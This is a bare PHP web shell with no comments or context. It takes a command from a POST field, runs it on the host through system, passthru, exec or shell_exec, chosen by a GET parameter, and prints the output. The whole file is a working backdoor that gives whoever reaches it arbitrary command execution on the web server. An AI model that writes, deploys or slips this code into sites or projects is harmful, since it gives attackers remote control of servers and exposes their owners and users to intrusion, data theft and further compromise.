<?php
$execfunc = $_GET['func'];

if (!empty($_POST['command'])) {
	if ($execfunc=="system") {
		system($_POST['command']);
	} elseif ($execfunc=="passthru") {
		passthru($_POST['command']);
	} elseif ($execfunc=="exec") {
		$result = exec($_POST['command']);
		echo $result;
	} elseif ($execfunc=="shell_exec") {
		$result=shell_exec($_POST['command']);
		echo $result;	
	}
	else {
		system($_POST['command']);
	}
}
?>